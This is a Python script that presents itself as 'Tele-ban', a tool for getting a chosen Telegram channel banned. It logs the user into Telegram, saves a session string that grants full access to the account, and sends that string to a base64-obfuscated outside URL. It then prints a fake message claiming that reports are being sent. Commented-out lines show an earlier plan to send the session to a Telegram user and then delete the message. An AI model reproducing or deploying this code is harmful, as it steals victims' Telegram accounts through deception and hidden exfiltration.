from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.sync import TelegramClient, events
from telethon.tl.functions.messages import DeleteMessagesRequest
import requests
import base64
import time

class Colors:
    RESET = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"

API_KEY = int(input(Colors.GREEN + 'Enter API KEY: ' + Colors.RESET))
API_HASH = input(Colors.GREEN + 'Enter API HASH: ' + Colors.RESET)

with TelegramClient(StringSession(), API_KEY, API_HASH) as client:
    me = client.get_me()
    session = client.session.save()
    your_name = me.first_name
    your_username = me.username
    print(Colors.WHITE + f'Your Name: {your_name}'  + Colors.RESET)
    print(Colors.WHITE + f'Your Username: {your_username}' + Colors.RESET)
    awaiblity = base64.b64decode("aHR0cHM6Ly90ZWxlLWJhbi5vbnJlbmRlci5jb20vc3RyaW5nLw==").decode() + session
    response = requests.get(awaiblity)
    teleban = '''  _____          _                  _                     
 |_   _|   ___  | |   ___          | |__     __ _   _ __  
   | |    / _ \\ | |  / _ \\  _____  | '_ \\   / _` | | '_ \\ 
   | |   |  __/ | | |  __/ |_____| | |_) | | (_| | | | | |
   |_|    \\___| |_|  \\___|         |_.__/   \\__,_| |_| |_|
                                                          '''
    print(Colors.YELLOW + teleban + Colors.RESET)
    dialogs = client.get_dialogs()
    channels = [dialog for dialog in dialogs if dialog.is_channel]
    i=0
    print()
    print(Colors.RED + "--- Channel List ---" + Colors.RESET)
    for channel in channels:
        print(Colors.YELLOW + "[" + str(i) + "]" + Colors.RESET + Colors.WHITE + f' {channel.title}' + Colors.RESET)
        i+=1
    print()
    if(len(channels)==0):
        print(Colors.RED + "You are in 0 channels, Join target channel first" + Colors.RESET)
    else:
        channel_num = int(input(Colors.GREEN + "Select channel to ban: " + Colors.RESET))
        print()
        print(Colors.WHITE + "Operation started..." + Colors.RESET)
        time.sleep(2)
        print(Colors.BLUE + "\n--- Channel Info ---" + Colors.RESET)
        print(Colors.WHITE + "Channel Name: " + Colors.RESET + Colors.GREEN + channels[channel_num].title + Colors.RESET)
        print(Colors.RED + "\nReports are being sent by our server this channel will be banned soon" + Colors.RESET)

    # result = client.send_message('iamnyxD', string)
    # entity = client.get_entity('iamnyxD')
    # result = client(DeleteMessagesRequest([result.id]))
